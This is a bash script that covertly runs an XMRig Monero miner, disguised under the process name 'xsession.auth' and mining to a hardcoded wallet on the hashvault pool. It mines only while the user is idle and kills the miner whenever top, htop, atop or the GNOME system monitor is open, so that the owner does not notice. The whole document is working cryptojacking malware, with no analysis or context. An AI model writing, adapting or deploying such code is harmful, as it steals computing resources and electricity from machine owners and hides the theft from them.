#!/bin/bash

# Settings
XMRIGNAME=xsession.auth
WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
LOCAL_PATH=$HOME/.local/bin
POOL=pool.hashvault.pro:80
INACTIVITY_IN_MINS=1
INACTIVITY_IN_MSEC=$(($INACTIVITY_IN_MINS * 60 * 1000))

ensure_os() {
	machine=$(uname -m)
	if [[ $machine != "x86_64" ]]; then
			exit
	fi

	id=$(awk -F'=' '/^ID=/ {print $2}' /etc/os-release)
	if [[ $id != "linuxmint" && $id != "fedora" ]]; then
			exit
	fi
}

run_xmr() {
	cmd="$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero -B"
	if ! pgrep $XMRIGNAME; then
		$cmd
	fi		 
}

ensure_no_top() {
	if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "gnome-system-monitor"; then
		pkill $XMRIGNAME
	fi
}

main() {
	ensure_os

	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)

	while true; do 
		ensure_no_top

		if [[ isUI -eq 1 ]]; then
			idle=$(xprintidle)
			echo "UI, idle for $idle"
			if [[ idle -gt $INACTIVITY_IN_MSEC ]]; then
				run_xmr
			else 
				pkill $XMRIGNAME 
			fi
		else
			idle=$(who -u | awk '{print $5}')
			echo "Text, idle for $idle"
			if [[ $idle == "old" ]]; then
				run_xmr
			elif [[ $idle != "." ]]; then 
				idleH=$(cut -d':' -f1)
				idleM=$(cut -d':' -f2)
				if [[ $idleH -gt 0 || $idleM -gt $INACTIVITY_IN_MINS ]]; then
					run_xmr
				else
					pkill $XMRIGNAME
				fi
			else 
				pkill $XMRIGNAME
			fi
		fi
		sleep 1
	done
}

main